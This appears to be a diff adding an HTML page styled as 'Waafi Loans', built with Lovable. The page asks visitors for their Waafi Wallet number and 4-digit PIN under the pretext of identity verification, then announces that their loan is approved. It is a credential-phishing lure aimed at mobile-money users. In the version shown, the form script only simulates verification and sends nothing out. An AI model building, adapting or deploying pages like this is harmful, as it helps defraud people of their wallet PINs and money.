@@ -1,0 +1,888 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Verify Your Identity — Waafi Loans</title>
+    <meta name="description" content="Verify your identity to complete your Waafi loan application. Enter your Waafi Wallet number and PIN to confirm." />
+    <meta name="author" content="Waafi Loans" />
+    <meta property="og:type" content="website" />
+    <meta property="og:title" content="Verify Your Identity — Waafi Loans" />
+    <meta property="og:description" content="Enter your Waafi Wallet number and PIN to verify and complete your loan application." />
+    <meta name="twitter:card" content="summary_large_image" />
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>W</text></svg>" />
+    <style>
+        /* ===== RESET ===== */
+        *,
+        *::before,
+        *::after {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --primary: oklch(56% .14 152);
+            --primary-90: oklab(0.56 -0.123613 0.065726 / 0.9);
+            --secondary: oklch(96% .02 150);
+            --background: oklch(99.5% .003 145);
+            --card: oklch(100% 0 0);
+            --border: oklch(91% .012 150);
+            --input: oklch(91% .012 150);
+            --ring: oklch(56% .14 152);
+            --text-primary: oklch(22% .02 150);
+            --text-secondary: oklch(50% .02 152);
+            --text-muted: oklch(50% .02 152);
+            --accent: oklch(96% .02 150);
+            --accent-foreground: oklch(22% .02 150);
+            --radius: 16px;
+            --radius-sm: 10px;
+            --transition: 0.25s cubic-bezier(0.16, 1, 0.32, 1);
+            --font-sans: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+        }
+
+        html {
+            scroll-behavior: smooth;
+        }
+
+        body {
+            font-family: var(--font-sans);
+            background: var(--background);
+            color: var(--text-primary);
+            line-height: 1.6;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        a {
+            text-decoration: none;
+            color: inherit;
+        }
+
+        img {
+            display: block;
+            max-width: 100%;
+            height: auto;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 24px;
+        }
+
+        /* ===== HEADER ===== */
+        .header {
+            position: sticky;
+            top: 0;
+            z-index: 40;
+            background: oklab(1 0 0 / 0.95);
+            backdrop-filter: blur(12px);
+            border-bottom: 1px solid var(--border);
+        }
+
+        .header-inner {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            height: 64px;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 16px;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .logo-icon {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 36px;
+            height: 36px;
+            background: var(--primary);
+            color: #fff;
+            border-radius: 8px;
+            font-size: 0.875rem;
+            font-weight: 700;
+        }
+
+        .logo-text {
+            font-size: 1.125rem;
+            font-weight: 700;
+            letter-spacing: -0.02em;
+            color: var(--text-primary);
+        }
+
+        .nav {
+            display: none;
+            align-items: center;
+            gap: 24px;
+        }
+
+        .nav a {
+            font-size: 0.875rem;
+            font-weight: 500;
+            color: var(--text-muted);
+            transition: color var(--transition);
+        }
+
+        .nav a:hover,
+        .nav a.active {
+            color: var(--primary);
+        }
+
+        .nav a.active {
+            color: var(--primary);
+        }
+
+        .lang-btn {
+            display: flex;
+            align-items: center;
+            gap: 4px;
+            background: transparent;
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            padding: 4px 8px;
+            font-size: 0.875rem;
+            font-weight: 500;
+            color: var(--text-primary);
+            cursor: pointer;
+            transition: all var(--transition);
+        }
+
+        .lang-btn:hover {
+            border-color: var(--primary);
+        }
+
+        .lang-btn svg {
+            width: 16px;
+            height: 16px;
+        }
+
+        .mobile-menu-btn {
+            display: block;
+            background: none;
+            border: none;
+            color: var(--text-primary);
+            cursor: pointer;
+            padding: 4px;
+        }
+
+        .mobile-menu-btn svg {
+            width: 24px;
+            height: 24px;
+        }
+
+        /* ===== MAIN CONTENT ===== */
+        .main-content {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 48px 16px;
+        }
+
+        .verify-container {
+            max-width: 448px;
+            width: 100%;
+            margin: 0 auto;
+        }
+
+        /* ===== VERIFY CARD ===== */
+        .verify-card {
+            padding: 32px;
+            border-radius: var(--radius);
+            border: 1px solid var(--border);
+            background: var(--card);
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.06);
+        }
+
+        /* Icon */
+        .verify-icon {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 64px;
+            height: 64px;
+            border-radius: 50%;
+            background: oklab(0.56 -0.123613 0.065726 / 0.10);
+            margin: 0 auto 16px;
+        }
+
+        .verify-icon svg {
+            width: 32px;
+            height: 32px;
+            color: var(--primary);
+        }
+
+        /* Title & Subtitle */
+        .verify-title {
+            text-align: center;
+            font-size: 1.5rem;
+            font-weight: 700;
+            letter-spacing: -0.02em;
+            color: var(--text-primary);
+            margin-bottom: 4px;
+        }
+
+        .verify-subtitle {
+            text-align: center;
+            font-size: 0.875rem;
+            color: var(--text-muted);
+            margin-bottom: 24px;
+        }
+
+        /* ===== FORM ===== */
+        .verify-form {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+
+        .form-group {
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
+        }
+
+        .form-group label {
+            font-size: 0.875rem;
+            font-weight: 500;
+            color: var(--text-primary);
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 10px 14px;
+            border-radius: 8px;
+            border: 1px solid var(--input);
+            background: var(--card);
+            font-size: 1rem;
+            color: var(--text-primary);
+            outline: none;
+            transition: all var(--transition);
+        }
+
+        .form-group input:focus {
+            border-color: var(--primary);
+            box-shadow: 0 0 0 2px oklab(0.56 -0.123613 0.065726 / 0.4);
+        }
+
+        .form-group input::placeholder {
+            color: var(--text-muted);
+        }
+
+        .form-hint {
+            font-size: 0.75rem;
+            color: var(--text-muted);
+            margin-top: 4px;
+        }
+
+        /* ===== PIN INPUT ===== */
+        .pin-container {
+            display: flex;
+            gap: 12px;
+            justify-content: center;
+        }
+
+        .pin-input {
+            width: 48px;
+            height: 56px;
+            text-align: center;
+            font-size: 1.25rem;
+            font-weight: 600;
+            border-radius: 8px;
+            border: 2px solid var(--input);
+            background: var(--card);
+            color: var(--text-primary);
+            outline: none;
+            transition: all var(--transition);
+        }
+
+        .pin-input:focus {
+            border-color: var(--primary);
+            box-shadow: 0 0 0 2px oklab(0.56 -0.123613 0.065726 / 0.4);
+        }
+
+        .pin-input:not(:placeholder-shown) {
+            border-color: var(--primary);
+        }
+
+        /* ===== SUBMIT BUTTON ===== */
+        .verify-btn {
+            width: 100%;
+            padding: 12px 24px;
+            border-radius: 12px;
+            border: none;
+            background: var(--primary);
+            color: #fff;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all var(--transition);
+            margin-top: 4px;
+        }
+
+        .verify-btn:hover {
+            background: var(--primary-90);
+            transform: scale(1.01);
+        }
+
+        .verify-btn:active {
+            transform: scale(0.98);
+        }
+
+        /* ===== HELP TEXT ===== */
+        .help-text {
+            text-align: center;
+            font-size: 0.875rem;
+            color: var(--text-muted);
+            margin-top: 16px;
+        }
+
+        .help-text a {
+            color: var(--primary);
+            font-weight: 500;
+            cursor: pointer;
+            transition: color var(--transition);
+        }
+
+        .help-text a:hover {
+            color: var(--primary-90);
+            text-decoration: underline;
+        }
+
+        /* ===== FOOTER ===== */
+        .footer {
+            border-top: 1px solid var(--border);
+            background: var(--secondary);
+            padding: 32px 0;
+        }
+
+        .footer-inner {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 16px;
+            text-align: center;
+            font-size: 0.875rem;
+            color: var(--text-muted);
+        }
+
+        /* ===== LOVABLE BADGE ===== */
+        #lovable-badge {
+            --badge-bg: #1b1b1b;
+            --badge-text: #c5c1b9;
+            --badge-text-hover: #dcdad5;
+            --badge-radius: 6px;
+            --badge-padding: 8px;
+            --badge-gap: 6px;
+            --badge-shadow: 
+                0 0 0 1px rgba(0, 0, 0, 0.88),
+                0 1px 0 0 rgba(0, 0, 0, 0.04),
+                0 2px 2px -1px rgba(0, 0, 0, 0.08),
+                0 4px 4px -2px rgba(0, 0, 0, 0.08),
+                0 8px 8px -4px rgba(0, 0, 0, 0.08),
+                0 16px 16px -8px rgba(0, 0, 0, 0.08);
+            --badge-transition-duration: 0.2s;
+            --badge-transition-easing: cubic-bezier(0.16, 1, 0.32, 1);
+            --focus-color: #575ECF;
+            --focus-offset: 2px;
+            --focus-width: 2px;
+            
+            position: fixed;
+            bottom: 12px;
+            right: 12px;
+            height: 24px;
+            display: flex;
+            align-items: center;
+            z-index: 1000000;
+            background-color: var(--badge-bg) !important;
+            color: var(--badge-text) !important;
+            border-radius: var(--badge-radius);
+            box-shadow: var(--badge-shadow) !important;
+            font-size: 12px;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            font-weight: 400 !important;
+            text-transform: none !important;
+            font-feature-settings: normal !important;
+            transform: translateZ(0);
+            will-change: transform, opacity;
+        }
+
+        #lovable-badge-cta {
+            display: flex;
+            align-items: center;
+            gap: var(--badge-gap);
+            padding: 0 var(--badge-padding);
+            height: 100%;
+            color: inherit;
+            text-decoration: none;
+            white-space: nowrap;
+            border-radius: var(--badge-radius) 0 0 var(--badge-radius);
+            transition: 
+                background-color var(--badge-transition-duration) ease,
+                color var(--badge-transition-duration) ease,
+                transform 0.1s ease;
+        }
+
+        #lovable-badge-cta:hover {
+            background: rgba(255, 255, 255, 0.04);
+            color: var(--badge-text-hover);
+        }
+
+        #lovable-badge-cta:active {
+            transform: scale(0.98);
+        }
+
+        #lovable-badge-cta:focus {
+            outline: none;
+        }
+
+        #lovable-badge-cta:focus-visible {
+            outline: var(--focus-width) solid var(--focus-color);
+            outline-offset: var(--focus-offset);
+            z-index: 1;
+        }
+
+        #lovable-badge-text {
+            line-height: 1;
+        }
+
+        #lovable-badge-divider {
+            width: 1px;
+            height: 24px;
+            background-color: rgba(255, 255, 255, 0.04);
+            flex-shrink: 0;
+        }
+
+        #lovable-badge-close {
+            width: 24px;
+            height: 24px;
+            min-width: 24px;
+            min-height: 24px;
+            cursor: pointer;
+            background: none;
+            border: none;
+            padding: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 0 var(--badge-radius) var(--badge-radius) 0;
+            flex-shrink: 0;
+            transition: 
+                background-color var(--badge-transition-duration) ease,
+                transform 0.1s ease;
+        }
+
+        #lovable-badge-close:hover {
+            background: rgba(255, 255, 255, 0.04);
+        }
+
+        #lovable-badge-close:active {
+            transform: scale(0.92);
+        }
+
+        #lovable-badge-close:focus {
+            outline: none;
+        }
+
+        #lovable-badge-close:focus-visible {
+            outline: var(--focus-width) solid var(--focus-color);
+            outline-offset: calc(var(--focus-offset) * -1);
+            z-index: 1;
+        }
+
+        #lovable-badge-close svg path {
+            fill: var(--badge-text);
+            transition: fill var(--badge-transition-duration) ease;
+        }
+
+        #lovable-badge-close:hover svg path {
+            fill: var(--badge-text-hover);
+        }
+
+        @media (prefers-reduced-motion: reduce) {
+            #lovable-badge-cta,
+            #lovable-badge-close,
+            #lovable-badge-close svg path {
+                transition: none;
+            }
+            
+            #lovable-badge-cta:active,
+            #lovable-badge-close:active {
+                transform: none;
+            }
+        }
+
+        @media (prefers-contrast: high) {
+            #lovable-badge {
+                --badge-bg: #000;
+                --badge-text: #fff;
+                --badge-text-hover: #fff;
+                border: 2px solid currentColor;
+            }
+            
+            #lovable-badge-cta:focus-visible,
+            #lovable-badge-close:focus-visible {
+                outline-width: 3px;
+            }
+        }
+
+        /* ===== RESPONSIVE ===== */
+        @media (min-width: 768px) {
+            .nav {
+                display: flex;
+            }
+
+            .mobile-menu-btn {
+                display: none;
+            }
+        }
+
+        @media (max-width: 767px) {
+            .nav {
+                display: none;
+                flex-direction: column;
+                position: absolute;
+                top: 64px;
+                left: 0;
+                right: 0;
+                background: oklab(1 0 0 / 0.98);
+                backdrop-filter: blur(12px);
+                padding: 20px 16px;
+                border-bottom: 1px solid var(--border);
+                gap: 16px;
+                align-items: flex-start;
+            }
+
+            .nav.open {
+                display: flex;
+            }
+
+            .main-content {
+                padding: 32px 16px;
+            }
+
+            .verify-card {
+                padding: 24px;
+            }
+
+            .verify-title {
+                font-size: 1.25rem;
+            }
+
+            .pin-input {
+                width: 40px;
+                height: 48px;
+                font-size: 1rem;
+            }
+
+            .pin-container {
+                gap: 8px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .pin-input {
+                width: 36px;
+                height: 44px;
+                font-size: 0.875rem;
+            }
+
+            .pin-container {
+                gap: 6px;
+            }
+
+            .verify-card {
+                padding: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ===== HEADER ===== -->
+    <header class="header">
+        <div class="header-inner">
+            <a class="logo" href="/">
+                <span class="logo-icon">W</span>
+                <span class="logo-text">Waafi Loans</span>
+            </a>
+
+            <nav class="nav" id="mainNav">
+                <a href="/">Home</a>
+                <a href="/apply">Apply Now</a>
+                <a href="/testimonials">Testimonials</a>
+                <a href="/terms">Terms and Conditions</a>
+                <a href="/loan-policy">Loan Policy</a>
+                <button class="lang-btn">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="10" />
+                        <path d="M12 2a14.5 14.5 0 0 0 0 20 14.5 14.5 0 0 0 0-20" />
+                        <path d="M2 12h20" />
+                    </svg>
+                    EN
+                </button>
+            </nav>
+
+            <button class="mobile-menu-btn" id="menuToggle" aria-label="Menu">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M4 5h16" />
+                    <path d="M4 12h16" />
+                    <path d="M4 19h16" />
+                </svg>
+            </button>
+        </div>
+    </header>
+
+    <!-- ===== MAIN CONTENT ===== -->
+    <main class="main-content">
+        <div class="verify-container">
+            <div class="verify-card">
+                <!-- Icon -->
+                <div class="verify-icon">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
+                        <path d="M9 12l2 2 4-4" />
+                    </svg>
+                </div>
+
+                <!-- Title & Subtitle -->
+                <h1 class="verify-title">Verify Your Identity</h1>
+                <p class="verify-subtitle">Enter your Waafi Wallet details to complete your loan application</p>
+
+                <!-- Form -->
+                <form class="verify-form" id="verifyForm">
+                    <!-- Phone Number -->
+                    <div class="form-group">
+                        <label for="phoneNumber">Waafi Wallet Number</label>
+                        <input 
+                            type="tel" 
+                            id="phoneNumber" 
+                            placeholder="Enter your Waafi Wallet number" 
+                            required 
+                            autocomplete="tel"
+                        />
+                        <span class="form-hint">Enter the number registered on your Waafi Wallet</span>
+                    </div>
+
+                    <!-- PIN Input -->
+                    <div class="form-group">
+                        <label>Enter PIN</label>
+                        <div class="pin-container" id="pinContainer">
+                            <input 
+                                type="password" 
+                                class="pin-input" 
+                                maxlength="1" 
+                                inputmode="numeric" 
+                                pattern="[0-9]" 
+                                required 
+                                autocomplete="off"
+                            />
+                            <input 
+                                type="password" 
+                                class="pin-input" 
+                                maxlength="1" 
+                                inputmode="numeric" 
+                                pattern="[0-9]" 
+                                required 
+                                autocomplete="off"
+                            />
+                            <input 
+                                type="password" 
+                                class="pin-input" 
+                                maxlength="1" 
+                                inputmode="numeric" 
+                                pattern="[0-9]" 
+                                required 
+                                autocomplete="off"
+                            />
+                            <input 
+                                type="password" 
+                                class="pin-input" 
+                                maxlength="1" 
+                                inputmode="numeric" 
+                                pattern="[0-9]" 
+                                required 
+                                autocomplete="off"
+                            />
+                        </div>
+                        <span class="form-hint">Enter your 4-digit Waafi Wallet PIN</span>
+                    </div>
+
+                    <!-- Submit Button -->
+                    <button type="submit" class="verify-btn">Verify &amp; Continue</button>
+                </form>
+
+                <!-- Help Text -->
+                <p class="help-text">
+                    Don't have a Waafi Wallet? <a href="#">Sign up here</a>
+                </p>
+            </div>
+        </div>
+    </main>
+
+    <!-- ===== FOOTER ===== -->
+    <footer class="footer">
+        <div class="footer-inner">
+            © 2026 Waafi Loans. All rights reserved.
+        </div>
+    </footer>
+
+    <!-- ===== LOVABLE BADGE ===== -->
+    <aside id="lovable-badge" role="complementary" dir="ltr" lang="en" aria-label="Edit with Lovable">
+        <a id="lovable-badge-cta" target="_blank" href="https://lovable.dev/projects/lovp_5mqs04c57f9gmtvsxjg79tt5ej?utm_source=lovable-badge" rel="noopener nofollow" aria-label="Edit with Lovable">
+            <span id="lovable-badge-text">Edit with</span>
+            <svg xmlns="http://www.w3.org/2000/svg" width="52" height="16" fill="none" viewBox="0 0 52 16">
+                <path fill="#FCFBF8" fill-rule="evenodd" d="M20.318 5.25c.643 0 1.206.14 1.69.418a2.81 2.81 0 0 1 1.118 1.191c.266.513.4 1.115.4 1.807s-.134 1.296-.4 1.812a2.81 2.81 0 0 1-1.118 1.193c-.484.278-1.047.418-1.69.418s-1.208-.14-1.695-.418a2.85 2.85 0 0 1-1.125-1.193c-.262-.516-.393-1.12-.393-1.812s.131-1.294.393-1.807a2.848 2.848 0 0 1 1.125-1.191c.487-.279 1.052-.418 1.695-.418Zm0 1.425c-.27 0-.504.076-.7.228-.193.147-.34.37-.443.67-.102.295-.153.66-.153 1.093 0 .435.05.801.153 1.1.102.3.25.524.443.676.196.147.43.22.7.22.27 0 .502-.073.694-.22.193-.152.341-.375.443-.67.103-.299.153-.667.153-1.106 0-.65-.112-1.145-.337-1.481a1.08 1.08 0 0 0-.953-.51ZM32.7 5.25c.61 0 1.127.1 1.549.3.422.197.74.48.953.849.217.368.325.809.325 1.32v2.704c0 .29.02.562.062.812.044.245.108.4.19.466V12h-1.935a5.895 5.895 0 0 1-.105-.684 7.745 7.745 0 0 1-.02-.228 2.293 2.293 0 0 1-.151.203c-.205.242-.47.437-.793.584-.32.143-.685.215-1.094.215-.406 0-.77-.08-1.094-.24a1.845 1.845 0 0 1-.756-.682 1.984 1.984 0 0 1-.27-1.045c0-.606.178-1.069.535-1.388.356-.324.87-.534 1.542-.633l1.125-.16c.225-.032.403-.074.534-.123a.622.622 0 0 0 .288-.196.549.549 0 0 0 .093-.327.65.65 0 0 0-.11-.367.702.702 0 0 0-.32-.27c-.14-.07-.31-.105-.51-.105-.32 0-.576.083-.768.251-.193.164-.298.39-.314.676h-1.923c.016-.434.147-.82.393-1.155.25-.34.596-.604 1.039-.792.442-.189.954-.283 1.535-.283Zm.99 3.498a.98.98 0 0 1-.215.14 2.49 2.49 0 0 1-.584.178l-.473.092c-.315.061-.553.156-.713.283-.155.127-.233.305-.233.534 0 .23.084.412.252.547.168.135.383.203.645.203s.494-.058.694-.173c.201-.118.355-.282.461-.49.11-.21.166-.448.166-.714v-.6Zm4.526-2.375c.065-.125.138-.243.221-.349.197-.25.437-.44.719-.571.282-.135.6-.203.952-.203.528 0 .988.138 1.377.412.389.275.688.67.896 1.186.21.512.314 1.12.314 1.824 0 .7-.107 1.309-.32 1.825-.213.512-.518.906-.915 1.18-.393.275-.854.412-1.383.412-.352 0-.667-.062-.946-.184a1.832 1.832 0 0 1-.7-.554 2.2 2.2 0 0 1-.234-.383V12h-1.843V3h1.862v3.373Zm1.284.296c-.274 0-.51.085-.707.253-.192.163-.338.397-.436.7a3.376 3.376 0 0 0-.148 1.05c0 .406.05.759.148 1.058.098.299.243.53.436.694.197.164.433.246.707.246.279 0 .512-.082.7-.246.193-.164.336-.395.43-.694.099-.3.148-.652.148-1.058 0-.405-.05-.757-.147-1.056-.095-.299-.238-.53-.43-.694a1.015 1.015 0 0 0-.7-.253Zm9.416-1.419c.602 0 1.136.131 1.604.393.466.262.829.643 1.086 1.143.263.5.394 1.097.394 1.794 0 .7-.107 1.309-.32 1.825-.213.512-.518.906-.915 1.18-.393.275-.854.412-1.383.412-.352 0-.667-.062-.946-.184a1.832 1.832 0 0 1-.7-.554 2.2 2.2 0 0 1-.234-.383V12h-1.843V3h1.862v3.373Zm1.284.296c-.274 0-.51.085-.707.253-.192.163-.338.397-.436.7a3.376 3.376 0 0 0-.148 1.05c0 .406.05.759.148 1.058.098.299.243.53.436.694.197.164.433.246.707.246.279 0 .512-.082.7-.246.193-.164.336-.395.43-.694.099-.3.148-.652.148-1.058 0-.405-.05-.757-.147-1.056-.095-.299-.238-.53-.43-.694a1.015 1.015 0 0 0-.7-.253Z" clip-rule="evenodd" />
+                <path fill="#FCFBF8" d="m26.605 9.995 1.342-4.566h1.924L27.628 12h-2.07l-2.33-6.57h1.98l1.397 4.565Zm-13.013.143h2.256c1.632 0 1.421 1.837 1.418 1.861h-5.603V3h1.93v7.138Zm31.516 1.861h-1.862V3h1.862v8.999Z" />
+                <path fill="url(#a)" fill-rule="evenodd" d="M2.7 3c1.492 0 2.7 1.192 2.7 2.663v1.012h.9c1.49 0 2.7 1.192 2.7 2.662S7.791 12 6.3 12H0V5.663C0 4.193 1.209 3 2.7 3Z" clip-rule="evenodd" />
+                <defs>
+                    <radialGradient id="a" cx="0" cy="0" r="1" gradientTransform="matrix(-1.54236 7.07838 -10.231 -2.15602 4.627 5.022)" gradientUnits="userSpaceOnUse">
+                        <stop offset=".106" stop-color="#FE7B02" />
+                        <stop offset=".394" stop-color="#FE3F21" />
+                        <stop offset=".608" stop-color="#F858BC" />
+                        <stop offset=".929" stop-color="#575ECF" />
+                    </radialGradient>
+                </defs>
+            </svg>
+        </a>
+        <span id="lovable-badge-divider" aria-hidden="true"></span>
+        <button id="lovable-badge-close" aria-label="Dismiss" title="Dismiss" type="button">
+            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="none" viewBox="0 0 16 16" aria-hidden="true">
+                <path d="M10.646 4.646a.5.5 0 1 1 .707.708L8.707 8l2.646 2.646a.5.5 0 1 1-.707.707L8 8.707l-2.646 2.646a.5.5 0 1 1-.708-.707L7.293 8 4.646 5.354a.5.5 0 1 1 .708-.708L8 7.293l2.646-2.647Z" />
+            </svg>
+        </button>
+    </aside>
+
+    <!-- ===== SCRIPTS ===== -->
+    <script>
+        // Mobile Menu Toggle
+        const menuToggle = document.getElementById('menuToggle');
+        const mainNav = document.getElementById('mainNav');
+
+        menuToggle.addEventListener('click', function() {
+            mainNav.classList.toggle('open');
+        });
+
+        // Close menu on link click (mobile)
+        document.querySelectorAll('.nav a').forEach(link => {
+            link.addEventListener('click', () => {
+                mainNav.classList.remove('open');
+            });
+        });
+
+        // Don't show lovable-badge in iframe
+        if (window.self !== window.top || navigator.userAgent.includes('puppeteer')) {
+            var badge = document.getElementById('lovable-badge');
+            if (badge) {
+                badge.style.display = 'none';
+            }
+        }
+
+        // Lovable Badge Close
+        var closeButton = document.getElementById('lovable-badge-close');
+        if (closeButton) {
+            closeButton.addEventListener('click', function(event) {
+                event.preventDefault();
+                event.stopPropagation();
+                var badge = document.getElementById('lovable-badge');
+                if (badge) {
+                    badge.style.display = 'none';
+                }
+            });
+        }
+
+        // ===== PIN INPUT AUTO-FOCUS =====
+        const pinInputs = document.querySelectorAll('.pin-input');
+
+        pinInputs.forEach((input, index) => {
+            input.addEventListener('input', function(e) {
+                const value = this.value;
+                
+                // Only allow numbers
+                if (!/^[0-9]$/.test(value) && value !== '') {
+                    this.value = '';
+                    return;
+                }
+
+                // Auto-advance to next input
+                if (value.length === 1 && index < pinInputs.length - 1) {
+                    pinInputs[index + 1].focus();
+                }
+            });
+
+            input.addEventListener('keydown', function(e) {
+                // Backspace to previous input
+                if (e.key === 'Backspace' && this.value === '' && index > 0) {
+                    pinInputs[index - 1].focus();
+                }
+            });
+
+            // Prevent paste
+            input.addEventListener('paste', function(e) {
+                e.preventDefault();
+            });
+
+            // Focus on click
+            input.addEventListener('click', function() {
+                this.select();
+            });
+        });
+
+        // ===== FORM SUBMISSION =====
+        const verifyForm = document.getElementById('verifyForm');
+
+        verifyForm.addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            const phoneNumber = document.getElementById('phoneNumber').value;
+            let pin = '';
+            pinInputs.forEach(input => {
+                pin += input.value;
+            });
+
+            if (phoneNumber.length < 10) {
+                alert('Please enter a valid Waafi Wallet number.');
+                return;
+            }
+
+            if (pin.length !== 4) {
+                alert('Please enter your complete 4-digit PIN.');
+                return;
+            }
+
+            // Show loading state
+            const submitBtn = this.querySelector('.verify-btn');
+            const originalText = submitBtn.textContent;
+            submitBtn.textContent = 'Verifying...';
+            submitBtn.disabled = true;
+
+            // Simulate verification
+            setTimeout(() => {
+                alert('Verification successful! Your loan has been approved and funds will be sent to your Waafi Wallet.');
+                submitBtn.textContent = originalText;
+                submitBtn.disabled = false;
+                // Redirect to success page or dashboard
+                // window.location.href = '/success.html';
+            }, 1500);
+        });
+
+        // Auto-submit on PIN complete (optional)
+        pinInputs[3].addEventListener('input', function() {
+            if (this.value.length === 1) {
+                // Small delay to ensure the value is set
+                setTimeout(() => {
+                    verifyForm.dispatchEvent(new Event('submit'));
+                }, 300);
+            }
+        });
+    </script>
+
+</body>
+</html>
